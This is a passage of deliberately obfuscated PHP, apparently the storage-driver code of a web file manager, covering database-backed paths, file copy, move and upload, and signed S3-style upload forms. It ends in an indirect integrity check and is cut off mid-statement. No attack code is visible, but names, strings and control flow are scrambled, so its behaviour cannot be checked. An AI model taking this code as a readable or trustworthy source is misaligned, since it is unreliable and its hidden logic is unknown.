systemPath($E¦ëñİ‰Ş•) { goto a¢Ó®¥ß®Ü; B‰¦¤ì†â: return $F—–·ì›Ò; goto D’Àâà†ò©; c¸ãİ±ˆ÷¤: if ($F—–·ì›Ò) { return $F—–·ì›Ò; } if ($E¦ëñİ‰Ş• == $c…Óñƒëå¦[1146]) { $F—–·ì›Ò = self::make(Model($c…Óñƒëå¦[770])->systemRootPathAdd($c…Óñƒëå¦[1154])); } else { $F—–·ì›Ò = self::systemPath($c…Óñƒëå¦[1146]); $cšÕõÛì’ = self::sourceID($F—–·ì›Ò); $F—–·ì›Ò = self::make(Model($c…Óñƒëå¦[770])->mkdir($cšÕõÛì’, $E¦ëñİ‰Ş•)); } Model($c…Óñƒëå¦[1103])->set($c™ö‚§ª˜„, $F—–·ì›Ò); goto B‰¦¤ì†â; a¢Ó®¥ß®Ü: $c…Óñƒëå¦ =& $_SERVER[Æ¼ôºÙï]; $c™ö‚§ª˜„ = $c…Óñƒëå¦[1153] . ucfirst($E¦ëñİ‰Ş•); $F—–·ì›Ò = Model($c…Óñƒëå¦[1103])->get($c™ö‚§ª˜„); goto c¸ãİ±ˆ÷¤; D’Àâà†ò©: } public static function systemFolder($A‘çõŒÄğß) { $bãÅÈŒÕãÍ = IO_PATH_SYSTEM_SOURCE . $A‘çõŒÄğß; $e†È‹­‡Óö = Cache::get($bãÅÈŒÕãÍ); if (!$e†È‹­‡Óö) { $E¾å–Øê = IO::infoFull($bãÅÈŒÕãÍ); if (!$E¾å–Øê) { $e†È‹­‡Óö = IO::mkdir($bãÅÈŒÕãÍ, REPEAT_SKIP); } else { $e†È‹­‡Óö = $E¾å–Øê[$_SERVER[Æ¼ôºÙï][75]]; } Cache::set($bãÅÈŒÕãÍ, $e†È‹­‡Óö, 3600 * 10); } return $e†È‹­‡Óö; } public static function defaultDriver() { return Model($_SERVER[Æ¼ôºÙï][722])->defaultDriver(); } public static function defaultIO() { $C ¿ä½àˆ =& $_SERVER[Æ¼ôºÙï]; $fÏØ¼ƒ½°§ = self::defaultDriver(); return $C ¿ä½àˆ[1155] . $fÏØ¼ƒ½°§[$C ¿ä½àˆ[385]] . $C ¿ä½àˆ[1143]; } public static function defaultDriverInit() { static $f™ä½Î†˜ = false; if ($f™ä½Î†˜) { return $f™ä½Î†˜; } $f™ä½Î†˜ = IO::init(self::defaultIO()); return $f™ä½Î†˜; } public static function fileTypeList() { $f›±«±‰ç =& $_SERVER[Æ¼ôºÙï]; $A‹š§×õ†À = $GLOBALS[$f›±«±‰ç[6]][$f›±«±‰ç[1156]]; foreach ($A‹š§×õ†À as $cùî˜°Ê => $FĞ¸ºÍÑ–é) { $E¼–ê½øÌ¥ = $f›±«±‰ç[1157] . $cùî˜°Ê; $e¿¥Í ÏïÄ = LNG($E¼–ê½øÌ¥); if ($E¼–ê½øÌ¥ != $e¿¥Í ÏïÄ) { $A‹š§×õ†À[$cùî˜°Ê][$f›±«±‰ç[28]] = $e¿¥Í ÏïÄ; } } return $A‹š§×õ†À; } public static function transferType($DáÅ£Å±¡, $a×´ºŒƒŸ) { goto dÀÚ“ÂÔÑ; eãòÎÛªá‰: if ($Béƒ°–‡«ó[$fƒÁÕ±óí¯[29]] == $A«¿Èç½’İ[$fƒÁÕ±óí¯[29]] && $Béƒ°–‡«ó[$fƒÁÕ±óí¯[1158]] == $A«¿Èç½’İ[$fƒÁÕ±óí¯[1158]]) { return $fƒÁÕ±óí¯[1159]; } if ($Béƒ°–‡«ó[$fƒÁÕ±óí¯[29]] == $fƒÁÕ±óí¯[803] && $A«¿Èç½’İ[$fƒÁÕ±óí¯[29]] == $fƒÁÕ±óí¯[105]) { return $fƒÁÕ±óí¯[1073]; } if ($Béƒ°–‡«ó[$fƒÁÕ±óí¯[29]] == $fƒÁÕ±óí¯[105] && $A«¿Èç½’İ[$fƒÁÕ±óí¯[29]] == $fƒÁÕ±óí¯[803]) { return $fƒÁÕ±óí¯[106]; } goto A¨ù…¡é‘; A¨ù…¡é‘: return $fƒÁÕ±óí¯[1160]; goto F’®‡éîß; dÀÚ“ÂÔÑ: $fƒÁÕ±óí¯ =& $_SERVER[Æ¼ôºÙï]; $Béƒ°–‡«ó = self::driverType($DáÅ£Å±¡); $A«¿Èç½’İ = self::driverType($a×´ºŒƒŸ); goto eãòÎÛªá‰; F’®‡éîß: } public static function driverType($bÛÇ¾‰òä) { goto f‹‘ÍÜ§Œ; f‹‘ÍÜ§Œ: $AÓÕ÷ÌÒ›Ã =& $_SERVER[Æ¼ôºÙï]; $D¬æ•íƒ  = $bÛÇ¾‰òä->path; $bõ˜æÇùƒÈ = str_replace($AÓÕ÷ÌÒ›Ã[1161], $AÓÕ÷ÌÒ›Ã[33], strtolower($bÛÇ¾‰òä->getType())); goto dä¡“šÌ´„; dä¡“šÌ´„: if ($bõ˜æÇùƒÈ == $AÓÕ÷ÌÒ›Ã[713] || $bõ˜æÇùƒÈ == $AÓÕ÷ÌÒ›Ã[1162] || $bõ˜æÇùƒÈ == $AÓÕ÷ÌÒ›Ã[1163]) { $bÛÇ¾‰òä = self::defaultDriverInit(); } else { if ($bõ˜æÇùƒÈ == $AÓÕ÷ÌÒ›Ã[1080] || $bõ˜æÇùƒÈ == $AÓÕ÷ÌÒ›Ã[1164]) { $bÛÇ¾‰òä = IO::init($bÛÇ¾‰òä->pathParse[$AÓÕ÷ÌÒ›Ã[1027]]); } } $bõ˜æÇùƒÈ = str_replace($AÓÕ÷ÌÒ›Ã[1161], $AÓÕ÷ÌÒ›Ã[33], strtolower($bÛÇ¾‰òä->getType())); if ($bõ˜æÇùƒÈ == $AÓÕ÷ÌÒ›Ã[105]) { return array($AÓÕ÷ÌÒ›Ã[29] => $AÓÕ÷ÌÒ›Ã[105], $AÓÕ÷ÌÒ›Ã[1158] => $AÓÕ÷ÌÒ›Ã[33], $AÓÕ÷ÌÒ›Ã[75] => $D¬æ•íƒ ); } goto Bæ¶­ÔöÂÙ; Bæ¶­ÔöÂÙ: return array($AÓÕ÷ÌÒ›Ã[29] => $AÓÕ÷ÌÒ›Ã[803], $AÓÕ÷ÌÒ›Ã[1158] => $bÛÇ¾‰òä->pathDriver, $AÓÕ÷ÌÒ›Ã[75] => $D¬æ•íƒ ); goto F“âÌ’’Ü’; F“âÌ’’Ü’: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($BÂİ§²³’†) { parent::__construct($BÂİ§²³’†); $this->signatureVersion($_SERVER[Æ¼ôºÙï][210]); } public function uploadFormData($e™© ”Ùï», $AÑ®ì»¡ßê = 3600) { goto bõ’öÀ·; cÇâß†—: $E›¹ÂêÑ¹Æ = sha1($fˆ…½¥ï¤); $fæ©Õ±¹³Â = hash_hmac($DÙ¹äÒÓŠˆ[228], $E›¹ÂêÑ¹Æ, $d‘‡¸Ñ„©Â); $E¸Á“ØŸÌ = array($DÙ¹äÒÓŠˆ[1169] => $EŸò°²„, $DÙ¹äÒÓŠˆ[1173] => $aÎ’ßé›Ä½, $DÙ¹äÒÓŠˆ[1177] => base64_encode($fˆ…½¥ï¤), $DÙ¹äÒÓŠˆ[1174] => $BÍÃÏ¼®ëé, $DÙ¹äÒÓŠˆ[1175] => $this->accessKey, $DÙ¹äÒÓŠˆ[1178] => $fêÄ”´õ, $DÙ¹äÒÓŠˆ[1179] => $fæ©Õ±¹³Â, $DÙ¹äÒÓŠˆ[175] => $this->getHost()); goto e¤…Ì´‘¿Ö; e¤…Ì´‘¿Ö: return $E¸Á“ØŸÌ; goto bë†Ÿ¨“‹Ó; FŒ©“º: $fˆ…½¥ï¤ = array($DÙ¹äÒÓŠˆ[1167] => $cŠÎ±–ğÁ, $DÙ¹äÒÓŠˆ[1168] => array(array($DÙ¹äÒÓŠˆ[1169] => $EŸò°²„), array($DÙ¹äÒÓŠˆ[1170] => $this->bucket), array($DÙ¹äÒÓŠˆ[1171], $DÙ¹äÒÓŠˆ[1172], $DÙ¹äÒÓŠˆ[33]), array($DÙ¹äÒÓŠˆ[1173] => $aÎ’ßé›Ä½), array($DÙ¹äÒÓŠˆ[1174] => $BÍÃÏ¼®ëé), array($DÙ¹äÒÓŠˆ[1175] => $this->accessKey), array($DÙ¹äÒÓŠˆ[1176] => $fêÄ”´õ))); $fˆ…½¥ï¤ = json_encode($fˆ…½¥ï¤); $d‘‡¸Ñ„©Â = hash_hmac($DÙ¹äÒÓŠˆ[228], $fêÄ”´õ, $this->secret); goto cÇâß†—; bõ’öÀ·: $DÙ¹äÒÓŠˆ =& $_SERVER[Æ¼ôºÙï]; $EŸò°²„ = $DÙ¹äÒÓŠˆ[191]; $BÍÃÏ¼®ëé = $DÙ¹äÒÓŠˆ[228]; goto BÑ­áÒÊæ; BÑ­áÒÊæ: $aÎ’ßé›Ä½ = $DÙ¹äÒÓŠˆ[1165]; $cŠÎ±–ğÁ = gmdate($DÙ¹äÒÓŠˆ[1166], time() + $AÑ®ì»¡ßê); $fêÄ”´õ = (string) time() . $DÙ¹äÒÓŠˆ[67] . (string) (time() + $AÑ®ì»¡ßê); goto FŒ©“º; bë†Ÿ¨“‹Ó: } public function fileOutLink($F²Üî¸‚ù¸) { $a¤›ŞÖ‚ò‰ =& $_SERVER[Æ¼ôºÙï]; if (substr($F²Üî¸‚ù¸, 0, 7) == $a¤›ŞÖ‚ò‰[1180]) { $F²Üî¸‚ù¸ = $a¤›ŞÖ‚ò‰[1181] . substr($F²Üî¸‚ù¸, 7); } header($a¤›ŞÖ‚ò‰[158] . $F²Üî¸‚ù¸); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($EğæÚ¨‘¸‘) { $this->pathParse = $EğæÚ¨‘¸‘; $this->model = Model($_SERVER[Æ¼ôºÙï][1182]); } public function getPath($BŒ‚½©‰) { return trim($BŒ‚½©‰, $_SERVER[Æ¼ôºÙï][8]); } public function pathFather($bêºÅµäµ) { $E±•ÙŠ²¾ = $this->parse($bêºÅµäµ); $E±•ÙŠ²¾ = $this->infoSimple($bêºÅµäµ); return $E±•ÙŠ²¾ ? $E±•ÙŠ²¾[$_SERVER[Æ¼ôºÙï][479]] : !1; } public function pathThis($fË‘ŞÁ) { $eÊ®ÆªÀ† = $this->infoSimple($fË‘ŞÁ); return $eÊ®ÆªÀ† ? $eÊ®ÆªÀ†[$_SERVER[Æ¼ôºÙï][28]] : !1; } public function getPathOuter($f›ùÆËÃÕ») { if (!$f›ùÆËÃÕ») { return $f›ùÆËÃÕ»; } $A›ÄŒ”„Ï­ = $this->parse($f›ùÆËÃÕ»); return KodIO::make($A›ÄŒ”„Ï­[$_SERVER[Æ¼ôºÙï][385]]); } public function copyFolderFromIO($e…ëÍÖÏÉâ, $aÂšä‰Ñâ, $d‚êšÖìœö, $E•†³ÛŒå, $A†ÎÍòšÌ˜) { $A²ÏËå¡î = $this->model->copyFolderFromIO($e…ëÍÖÏÉâ, $aÂšä‰Ñâ, $d‚êšÖìœö, $E•†³ÛŒå, $A†ÎÍòšÌ˜); return KodIO::make($A²ÏËå¡î); } public function isParentOf($f«ŞÚ¨´Ï‰, $F›ë¼ª½Êó) { return $this->model->isParentOf($f«ŞÚ¨´Ï‰, $F›ë¼ª½Êó); } public function mkfile($C‘œ¬Š­ù«, $CÉ´¡ğŠôÆ = '', $B½·¦â… = REPEAT_RENAME) { $B¬å‰Š†ê¼ =& $_SERVER[Æ¼ôºÙï]; $BÚÕå‘ï«Ö = $this->parse($C‘œ¬Š­ù«); $C‘œ¬Š­ù« = $BÚÕå‘ï«Ö[$B¬å‰Š†ê¼[385]]; for ($d‡±çƒ‘ = 0; $d‡±çƒ‘ < count($BÚÕå‘ï«Ö[$B¬å‰Š†ê¼[1183]]); $d‡±çƒ‘++) { $aê›Ë¨Øí® = $BÚÕå‘ï«Ö[$B¬å‰Š†ê¼[1183]][$d‡±çƒ‘]; if ($d‡±çƒ‘ == count($BÚÕå‘ï«Ö[$B¬å‰Š†ê¼[1183]]) - 1) { $C‘œ¬Š­ù« = $this->model->mkfile($C‘œ¬Š­ù«, $aê›Ë¨Øí®, $CÉ´¡ğŠôÆ, $B½·¦â…); break; } $C‘œ¬Š­ù« = $this->model->mkdir($C‘œ¬Š­ù«, $aê›Ë¨Øí®, REPEAT_SKIP); } return $this->getPathOuter($C‘œ¬Š­ù«); } public function mkdir($BŠ¼÷ôÄŞØ, $CÖõØƒ‚¯è = REPEAT_SKIP) { $AÍˆ¬áÅšò =& $_SERVER[Æ¼ôºÙï]; $aÉ½ô“Óäó = $this->parse($BŠ¼÷ôÄŞØ); $BŠ¼÷ôÄŞØ = $aÉ½ô“Óäó[$AÍˆ¬áÅšò[385]]; for ($EùÉ³Ş‚Ô = 0; $EùÉ³Ş‚Ô < count($aÉ½ô“Óäó[$AÍˆ¬áÅšò[1183]]); $EùÉ³Ş‚Ô++) { $eÌ«›ô‰­’ = $aÉ½ô“Óäó[$AÍˆ¬áÅšò[1183]][$EùÉ³Ş‚Ô]; $BŠ¼÷ôÄŞØ = $this->model->mkdir($BŠ¼÷ôÄŞØ, $eÌ«›ô‰­’, $CÖõØƒ‚¯è); } return $this->getPathOuter($BŠ¼÷ôÄŞØ); } public function copyFile($b¯õÜ­¯¶, $aòÊ—ğ·è½, $DàÍí¼”óæ = REPEAT_REPLACE) { $cŸ¼Œ‹¢÷à =& $_SERVER[Æ¼ôºÙï]; $eËÏ©‘ôÂ = $this->parse($aòÊ—ğ·è½); $CåŒŠÍ•³ = $this->model->copy($b¯õÜ­¯¶, $eËÏ©‘ôÂ[$cŸ¼Œ‹¢÷à[385]], $DàÍí¼”óæ, $eËÏ©‘ôÂ[$cŸ¼Œ‹¢÷à[75]]); return $CåŒŠÍ•³ ? $this->getPathOuter($CåŒŠÍ•³) : !1; } public function moveFile($aéêêÉéßè, $BÙ„âö–ßÑ, $C†¤Á‚šÂ = REPEAT_REPLACE) { $DÁğœŞ£øé =& $_SERVER[Æ¼ôºÙï]; $CŸµ‹†¯×‹ = $this->parse($BÙ„âö–ßÑ); $f“ŒØÒÆî‡ = $this->model->move($aéêêÉéßè, $CŸµ‹†¯×‹[$DÁğœŞ£øé[385]], $C†¤Á‚šÂ, $CŸµ‹†¯×‹[$DÁğœŞ£øé[75]]); return $f“ŒØÒÆî‡ ? $this->getPathOuter($f“ŒØÒÆî‡) : !1; } public function copy($e³Şù±È³‹, $b¾ê‹ØÁª, $cŒ„¨É…« = REPEAT_REPLACE) { $aÀÎé°”ã = $this->parse($b¾ê‹ØÁª); $bàØÕ¸ã‡± = $this->model->copy($e³Şù±È³‹, $aÀÎé°”ã[$_SERVER[Æ¼ôºÙï][385]], $cŒ„¨É…«); return $bàØÕ¸ã‡± ? $this->getPathOuter($bàØÕ¸ã‡±) : !1; } public function moveSameAllow() { } public function move($A«ºƒ°ƒÄœ, $C›îÜ¸‹²†, $dìÔÑ‹†µ = REPEAT_REPLACE) { $fŞÊ¥æ’à¥ = $this->parse($C›îÜ¸‹²†); $F³§áß•Œ¨ = $this->model->move($A«ºƒ°ƒÄœ, $fŞÊ¥æ’à¥[$_SERVER[Æ¼ôºÙï][385]], $dìÔÑ‹†µ); return $F³§áß•Œ¨ ? $this->getPathOuter($F³§áß•Œ¨) : !1; } public function remove($AÉÏãå•†, $dÙäÖ£ÕÏ¦ = true) { return $this->model->remove($AÉÏãå•†, $dÙäÖ£ÕÏ¦); } public function rename($b»´Âà¸¬, $eÛ‚Œ‹»‰á) { $d§´Ó‰Úİ± = $this->model->rename($b»´Âà¸¬, $eÛ‚Œ‹»‰á); return $d§´Ó‰Úİ± ? $this->getPathOuter($b»´Âà¸¬) : $d§´Ó‰Úİ±; } public function size($eìÃ´Ş›”) { $D–Üèô‚Ÿ = $this->infoSimple($eìÃ´Ş›”); return $D–Üèô‚Ÿ ? $D–Üèô‚Ÿ[$_SERVER[Æ¼ôºÙï][77]] : 0; } public function infoSimple($FÎ„²ÛÍ“ò) { return $this->model->sourceInfo($FÎ„²ÛÍ“ò); } public function info($Fæ±êÊ¥) { return $this->infoParse($Fæ±êÊ¥); } public function infoAuth($d¿ÑšİåŞö) { return $this->infoParse($d¿ÑšİåŞö, !1, !0); } public function infoWithChildren($aÜËº±‚Ğˆ) { return $this->infoParse($aÜËº±‚Ğˆ, !0); } protected function infoParse($C”ÆÌ«Î, $eç²ˆÌãÏÊ = false, $cˆ‘¸Ø³·¶ = false) { if (!$eç²ˆÌãÏÊ) { return $this->model->pathInfo($C”ÆÌ«Î, $cˆ‘¸Ø³·¶); } return $this->model->pathInfoMore($C”ÆÌ«Î); } public function infoFull($cê‡ÏŠÀ¼¢) { $F’Şî¹Ø­‚ =& $_SERVER[Æ¼ôºÙï]; $D³Äƒ¨ÅÊ¶ = explode($F’Şî¹Ø­‚[8], $cê‡ÏŠÀ¼¢); $EÜßÅÃà¼± = implode($F’Şî¹Ø­‚[8], array_splice($D³Äƒ¨ÅÊ¶, 1)); return $this->model->pathInfoByPath($D³Äƒ¨ÅÊ¶[0], $EÜßÅÃà¼±); } public function hashSimple($dÓåÀóå±) { $E¯®–ñ¹ =& $_SERVER[Æ¼ôºÙï]; $f¾ë³—‹’î = $this->infoWithChildren($dÓåÀóå±); return $f¾ë³—‹’î[$E¯®–ñ¹[163]][$E¯®–ñ¹[170]]; } public function hashMd5($b·‹ËÓÍî¿) { $d¥Ÿ˜öù’æ =& $_SERVER[Æ¼ôºÙï]; $cÄÜŒ¿›Ë„ = $this->infoWithChildren($b·‹ËÓÍî¿); return $cÄÜŒ¿›Ë„[$d¥Ÿ˜öù’æ[163]][$d¥Ÿ˜öù’æ[169]]; } public function exist($E‡‚ËÒçÄØ) { $C‰©ßœ¥ =& $_SERVER[Æ¼ôºÙï]; $e«Õİ˜‘õÅ = $this->parse($E‡‚ËÒçÄØ); if (!$e«Õİ˜‘õÅ[$C‰©ßœ¥[75]]) { return $this->isFile($E‡‚ËÒçÄØ) || $this->isFolder($E‡‚ËÒçÄØ); } $f¬ÍŞ ìæ = array($C‰©ßœ¥[386] => $e«Õİ˜‘õÅ[$C‰©ßœ¥[385]], $C‰©ßœ¥[28] => $e«Õİ˜‘õÅ[$C‰©ßœ¥[75]]); $fèŒÜÊÚŒî = $this->model->where($f¬ÍŞ ìæ)->find(); return $fèŒÜÊÚŒî ? !0 : !1; } public function isFile($D•ÆòãÍôè) { $e«¹©†Í‹ =& $_SERVER[Æ¼ôºÙï]; $d×Æ¬ß…İè = $this->infoSimple($D•ÆòãÍôè); return $d×Æ¬ß…İè && $d×Æ¬ß…İè[$e«¹©†Í‹[388]] == $e«¹©†Í‹[86] ? !1 : !0; } public function isFolder($F–¯ÆÒ–) { $fÁÔÔƒ¯§² =& $_SERVER[Æ¼ôºÙï]; $aÙËÎ´¾ˆ = $this->infoSimple($F–¯ÆÒ–); return $aÙËÎ´¾ˆ && $aÙËÎ´¾ˆ[$fÁÔÔƒ¯§²[388]] == $fÁÔÔƒ¯§²[86] ? !0 : !1; } public function listPath($FÂÍ ª†Ù, $eË‹îƒ = false) { $BåºÂ =& $_SERVER[Æ¼ôºÙï]; if ($FÂÍ ª†Ù == $BåºÂ[33]) { return !1; } $Bßø‚ù¿Á = array($BåºÂ[386] => $FÂÍ ª†Ù); if ($eË‹îƒ) { return $this->model->listSource($Bßø‚ù¿Á, -1); } return $this->model->listSource($Bßø‚ù¿Á); } public function has($B„°Â˜ÖÒ±, $DÜËæŞÜÚÄ = false, $e‰Ï­Î‘¬ = null) { $C·ÂËØÌ· =& $_SERVER[Æ¼ôºÙï]; $e˜ÆÚ¿‚È = $this->infoWithChildren($B„°Â˜ÖÒ±); if ($DÜËæŞÜÚÄ) { return array($C·ÂËØÌ·[202] => $e˜ÆÚ¿‚È[$C·ÂËØÌ·[202]], $C·ÂËØÌ·[201] => $e˜ÆÚ¿‚È[$C·ÂËØÌ·[201]]); } return $e‰Ï­Î‘¬ ? $e˜ÆÚ¿‚È[$C·ÂËØÌ·[202]] : $e˜ÆÚ¿‚È[$C·ÂËØÌ·[201]]; } public function listAll($aßÄëíñ) { $F©÷Ô¼Šª = IO::info($this->pathParse[$_SERVER[Æ¼ôºÙï][75]]); if (!$F©÷Ô¼Šª) { return array(); } return $this->model->listAll($aßÄëíñ); } public function getContent($aŒ•µ”îô) { return $this->model->getContent($aŒ•µ”îô); } public function setContent($cÌó¥‰Ü…ï, $D·ªÜ´öÌ» = '') { return $this->model->setContent($cÌó¥‰Ü…ï, $D·ªÜ´öÌ»); } public function fileSubstr($DŠ¾ë…ì, $bÉ¡‘ÜÄÓ, $fÄ¿‹îö§) { return $this->model->fileSubstr($DŠ¾ë…ì, $bÉ¡‘ÜÄÓ, $fÄ¿‹îö§); } public function download($C„ Û¬„ÄÃ, $BÑ’òµå = '') { $A¬­‡†Î¯ = get_path_father($BÑ’òµå); $b×º™©´µØ = get_path_this($BÑ’òµå); $E¤ĞÚòÂ¥Ë = $this->model->fileInfoGet($C„ Û¬„ÄÃ); $E½Ö¹íµÖñ = IO::copy($E¤ĞÚòÂ¥Ë[$_SERVER[Æ¼ôºÙï][75]], $A¬­‡†Î¯, !1, $b×º™©´µØ); return $E½Ö¹íµÖñ; } public function setModifyTime($cË« ³ã°‹, $a¶Û£Âäï = '') { $this->model->metaSet($cË« ³ã°‹, $_SERVER[Æ¼ôºÙï][1184], $a¶Û£Âäï); } public function upload($Cô‡§µİéñ, $cçÍÏ ¼éÙ, $DáïÜ‘†É = false, $BôŠ¹ÕÕ¾« = REPEAT_REPLACE) { $C£š¢ô =& $_SERVER[Æ¼ôºÙï]; $E¿½âİâæ = $this->parse($Cô‡§µİéñ); $F©„…ÍÅ®× = $this->model->addFile($E¿½âİâæ[$C£š¢ô[385]], $cçÍÏ ¼éÙ, $E¿½âİâæ[$C£š¢ô[75]], $DáïÜ‘†É, $BôŠ¹ÕÕ¾«); return $this->getPathOuter($F©„…ÍÅ®×); } public function uploadFileByID($CóàÓŸñäÚ, $dî„ŸÆºĞ, $cöÀµ‡”ÊË) { $aà·ù«í¤Í =& $_SERVER[Æ¼ôºÙï]; $AÚÎôø–ë§ = $this->parse($CóàÓŸñäÚ); $fÒîÕåàò« = $this->model->addFileByFileID($AÚÎôø–ë§[$aà·ù«í¤Í[385]], $dî„ŸÆºĞ, $AÚÎôø–ë§[$aà·ù«í¤Í[75]], $cöÀµ‡”ÊË); return $this->getPathOuter($fÒîÕåàò«); } public function addFileByRemote($dãä½—é¼, $EŒ²‘÷Á‘Õ, $fØ½ÕñâÕÚ = array(), $eÑåİØäˆÈ = '', $Aó¬ÜÜÉÎ„) { $a½ù§ˆ®†Õ =& $_SERVER[Æ¼ôºÙï]; $Aøïñš´ğŒ = $this->parse($dãä½—é¼); $eÑåİØäˆÈ = empty($eÑåİØäˆÈ) ? $Aøïñš´ğŒ[$a½ù§ˆ®†Õ[75]] : $eÑåİØäˆÈ; $e–ÉÀØÄåá = $this->model->addFileByRemote($Aøïñš´ğŒ[$a½ù§ˆ®†Õ[385]], $EŒ²‘÷Á‘Õ, $eÑåİØäˆÈ, $fØ½ÕñâÕÚ, $Aó¬ÜÜÉÎ„); return $this->getPathOuter($e–ÉÀØÄåá); } public function uploadLink($B«Šé¡ïÏå, $D®ÍÓ’¹ÙÔ = 0) { $Bâ¨‹ã÷â· =& $_SERVER[Æ¼ôºÙï]; $BÖØóÈ£æ = $this->parse($B«Šé¡ïÏå); $B«Šé¡ïÏå = Model($Bâ¨‹ã÷â·[560])->createFileName($BÖØóÈ£æ[$Bâ¨‹ã÷â·[75]]); $f‡ äÔ¹‰ = IO::uploadLink($B«Šé¡ïÏå, $D®ÍÓ’¹ÙÔ); return $f‡ äÔ¹‰; } public function fileNameAuto($aê²›ƒ¢, $CÑåõ³‘„, $b†¸•¦ï“ = REPEAT_REPLACE, $f™°Á¨…õõ = false) { return $this->model->fileNameAuto($aê²›ƒ¢, $CÑåõ³‘„, $b†¸•¦ï“, $f™°Á¨…õõ); } public function fileNameExist($C‡Âñô¸Ñä, $eÉ÷ãÕ´É§) { return $this->model->fileNameExist($C‡Âñô¸Ñä, $eÉ÷ãÕ´É§); } protected function _fileOut($fŒñòƒå‹, $cÑ“Ó¹ãö­ = false, $C˜¥Áë¬Çœ = false, $Dâ–å±‘‚ = '', $AªÂ‡ùÊÎÅ = false) { goto aôİƒ“¸Õ; aôİƒ“¸Õ: $a‹¯¡ÌÆ =& $_SERVER[Æ¼ôºÙï]; $d¯Äùó®ÇÑ = $this->model->sourceInfo($fŒñòƒå‹); if ($d¯Äùó®ÇÑ[$a‹¯¡ÌÆ[388]] == $a‹¯¡ÌÆ[86]) { header($a‹¯¡ÌÆ[1185]); die; } goto C‘š«Â¾¨·; Aè„Ù›øÏ¶: if ($AªÂ‡ùÊÎÅ) { return IO::fileOutServer($CÒ™âÍ•ñí[$a‹¯¡ÌÆ[75]], $cÑ“Ó¹ãö­, $Dô¥ù§±¦Å, $Dâ–å±‘‚); } IO::fileOut($CÒ™âÍ•ñí[$a‹¯¡ÌÆ[75]], $cÑ“Ó¹ãö­, $Dô¥ù§±¦Å, $Dâ–å±‘‚); goto bÊ‹‚Ò‹¹¿; C‘š«Â¾¨·: $CÒ™âÍ•ñí = $this->model->fileInfoGet($fŒñòƒå‹); $Dâ–å±‘‚ = $CÒ™âÍ•ñí[$a‹¯¡ÌÆ[169]] ? $CÒ™âÍ•ñí[$a‹¯¡ÌÆ[169]] : $Dâ–å±‘‚; $Dô¥ù§±¦Å = isset($GLOBALS[$a‹¯¡ÌÆ[1186]]) ? $GLOBALS[$a‹¯¡ÌÆ[1186]] : $d¯Äùó®ÇÑ[$a‹¯¡ÌÆ[28]]; goto Aè„Ù›øÏ¶; bÊ‹‚Ò‹¹¿: } public function fileOut($cª†ïËùõ, $dÛ«Ñ›÷Õ¯ = false, $bÛ¨ÃÂâ‚× = false, $bİ‡‘ªíë¢ = '') { $this->_fileOut($cª†ïËùõ, $dÛ«Ñ›÷Õ¯, $bÛ¨ÃÂâ‚×, $bİ‡‘ªíë¢); } public function fileOutServer($cä¶ÌÚáÉÈ, $E‰å…†¯Ó´ = false, $AÊÍ’ÎÃõ¦ = false, $dßâÛğÂ¦â = '') { $this->_fileOut($cä¶ÌÚáÉÈ, $E‰å…†¯Ó´, $AÊÍ’ÎÃõ¦, $dßâÛğÂ¦â, !0); } protected function _fileOutImage($CÍ÷ŠÈñÑ, $f‹œŒÜ”İ = 250) { goto AåèŞ£Ë“¦; fÅˆëÍÜø: $C‘‡„¡á„¾ = $this->model->fileInfoGet($CÍ÷ŠÈñÑ); $C‘‡„¡á„¾[$Cºì™Š÷¿½[28]] = $a›Ñ“½êÙà[$Cºì™Š÷¿½[28]]; $C‘‡„¡á„¾[$Cºì™Š÷¿½[162]] = $a›Ñ“½êÙà[$Cºì™Š÷¿½[162]]; goto F¤‰ÉçñÊ; AåèŞ£Ë“¦: $Cºì™Š÷¿½ =& $_SERVER[Æ¼ôºÙï]; $a›Ñ“½êÙà = $this->model->pathInfo($CÍ÷ŠÈñÑ); if ($a›Ñ“½êÙà[$Cºì™Š÷¿½[388]] == $Cºì™Š÷¿½[86]) { show_json($Cºì™Š÷¿½[1187] . $CÍ÷ŠÈñÑ, !1); } goto fÅˆëÍÜø; F¤‰ÉçñÊ: $GLOBALS[$Cºì™Š÷¿½[1186]] = $C‘‡„¡á„¾[$Cºì™Š÷¿½[28]]; $GLOBALS[$Cºì™Š÷¿½[161]] = $C‘‡„¡á„¾; IO::fileOutImage($C‘‡„¡á„¾[$Cºì™Š÷¿½[75]], $f‹œŒÜ”İ); goto C™êÌ™¬ğ; C™êÌ™¬ğ: } public function fileOutImage($e¸®‰ÑÂº, $bà¾ò°Á = 250) { $this->_fileOutImage($e¸®‰ÑÂº, $bà¾ò°Á); } public function fileOutImageServer($c³ŠÑ§š¨, $B“»œïÀ¾ = 250) { $this->_fileOutImage($c³ŠÑ§š¨, $B“»œïÀ¾); } public function link($eÔ‚ÑŒ‡È, $A”•ÍÌÔÓ˜ = '') { $B”Åš„ª› = $this->model->fileInfoGet($eÔ‚ÑŒ‡È); return IO::link($B”Åš„ª›[$_SERVER[Æ¼ôºÙï][75]], $A”•ÍÌÔÓ˜); } protected function parse($D‹Û®Ã¼òë) { $D¹ë»ôÎÊï =& $_SERVER[Æ¼ôºÙï]; if (strstr($D‹Û®Ã¼òë, $D¹ë»ôÎÊï[8]) === !1) { return array($D¹ë»ôÎÊï[403] => intval($D‹Û®Ã¼òë), $D¹ë»ôÎÊï[75] => $D¹ë»ôÎÊï[33], $D¹ë»ôÎÊï[1183] => array()); } $d†Ñê‡–ğ® = explode($D¹ë»ôÎÊï[8], trim($D‹Û®Ã¼òë, $D¹ë»ôÎÊï[8])); if (count($d†Ñê‡–ğ®) < 2) { show_tips($D‹Û®Ã¼òë . $D¹ë»ôÎÊï[1188]); } return array($D¹ë»ôÎÊï[403] => intval($d†Ñê‡–ğ®[0]), $D¹ë»ôÎÊï[75] => $d†Ñê‡–ğ®[1], $D¹ë»ôÎÊï[1183] => array_slice($d†Ñê‡–ğ®, 1)); } } goto cØ´öœÓÅ÷; Açë ¾’ßö: $D¹Å¼¥‘” = $_SERVER[$_SERVER[Æ¼ôºÙï][811]]; $C—È´Šœ = $_SERVER[Æ¼ôºÙï][812]; if ($_SERVER[$_SERVER[Æ¼ôºÙï][813]] != $C—È´Šœ($D¹Å¼¥‘”)) { goto Aø‰äœ¯”­; A·ä›Æ§£: $b§°Ñ§Ş‚… = explode($_SERVER[Æ¼ôºÙï][227], $EÂˆ¸„…‘ë); if (count($b§°Ñ§Ş‚…) < $_SERVER[Æ¼ôºÙï][567]) { $aĞñøŠƒ§ = $_SERVER[Æ¼ôºÙï][818]; $aĞñøŠƒ§(); } $B£°İĞù—¤ 